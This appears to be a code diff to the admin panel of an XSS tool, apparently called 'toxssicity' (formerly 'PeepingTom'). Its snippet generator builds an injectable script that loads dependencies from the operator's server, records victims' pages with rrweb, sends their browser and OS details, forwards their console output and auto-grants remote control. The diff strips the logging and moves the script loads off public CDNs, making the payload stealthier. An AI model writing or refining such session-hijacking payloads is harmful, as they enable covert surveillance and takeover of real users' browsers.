@@ -48,7 +48,6 @@ function toggleFullscreen() {
 
 // --- ADMIN DEBUGGING ---
 socket.on('connect', () => {
-    console.log('👑 [Admin] Connected to server. Socket ID:', socket.id);
     socket.emit('register-admin');
 });
 
@@ -298,21 +297,19 @@ function copyJsSnippet() {
     const serverURL = inpServerUrl.value.trim() || "http://localhost:3000";
 
     const payload = `(function() {
-console.log('[PeepingTom] Initialization started. Target Server: ${serverURL}');
 
 function loadScript(src, callback) {
-var s = document.createElement('script'); s.src = src; s.onload = () => { console.log('[PeepingTom] Loaded script: ' + src); callback(); }; s.onerror = (err) => console.error('[PeepingTom] Failed to load script: ' + src, err); document.head.appendChild(s);
+var s = document.createElement('script'); s.src = src; s.onload = () => { callback(); }; s.onerror = (err) => console.error('[toxssicity] Failed to load script: ' + src, err); document.head.appendChild(s);
 }
 
-loadScript('https://cdn.socket.io/4.7.2/socket.io.min.js', function() {
-loadScript('https://cdn.jsdelivr.net/npm/rrweb@1.1.3/dist/rrweb.min.js', function() {
-    console.log('[PeepingTom] Dependencies loaded. Attempting WebSocket connection...');
+loadScript('${serverURL}/ext-deps/js/socket.io.min.js', function() {
+loadScript('${serverURL}/ext-deps/js/rrweb.min.js', function() {
     const socket = io('${serverURL}', { transports: ['websocket'] });
     
     let isControlGranted = true; 
     let recordStopFn = null;
 
-    socket.on('connect_error', (err) => console.error('[PeepingTom] Socket.IO Error:', err.message));
+    socket.on('connect_error', (err) => console.error('[toxssicity] Socket.IO Error:', err.message));
 
     function parseUserEnv() {
         var ua = navigator.userAgent, b = "Unknown Browser", os = "Unknown OS";
@@ -322,7 +319,6 @@ loadScript('https://cdn.jsdelivr.net/npm/rrweb@1.1.3/dist/rrweb.min.js', functio
     }
 
     socket.on('connect', () => {
-        console.log('[PeepingTom] Connected to server successfully! Socket ID:', socket.id);
         socket.emit('register-specs', parseUserEnv());
     });
 
@@ -334,14 +330,13 @@ loadScript('https://cdn.jsdelivr.net/npm/rrweb@1.1.3/dist/rrweb.min.js', functio
     startCapture();
 
     socket.on('request-snapshot', () => {
-        console.log('[PeepingTom] Admin requested a fresh snapshot. Restarting capture...');
         startCapture();
     });
 
     const originalConsoleLog = console.log;
     console.log = function(...args) {
         originalConsoleLog.apply(console, args); 
-        if (!args[0] || (typeof args[0] === 'string' && !args[0].startsWith('[PeepingTom]'))) {
+        if (!args[0] || (typeof args[0] === 'string' && !args[0].startsWith('[toxssicity]'))) {
             socket.emit('client-js-result', { type: 'log', data: args.join(' '), clientId: socket.id });
         }
     };
@@ -359,7 +354,6 @@ loadScript('https://cdn.jsdelivr.net/npm/rrweb@1.1.3/dist/rrweb.min.js', functio
     });
 
     socket.on('control-requested', () => {
-        console.log('[PeepingTom] 🚨 CONTROL REQUEST RECEIVED FROM ADMIN! (Auto-approved for QA)');
         isControlGranted = true;
         socket.emit('control-approved');
     });
@@ -439,7 +433,6 @@ loadScript('https://cdn.jsdelivr.net/npm/rrweb@1.1.3/dist/rrweb.min.js', functio
             console.error("[Demo] Navigation failed:", error);
         }
     }, true);
-    console.log("[Demo] SPA navigation initialized");
 })();
 
 
@@ -495,3 +488,4 @@ loadScript('https://cdn.jsdelivr.net/npm/rrweb@1.1.3/dist/rrweb.min.js', functio
 
 
 }
+
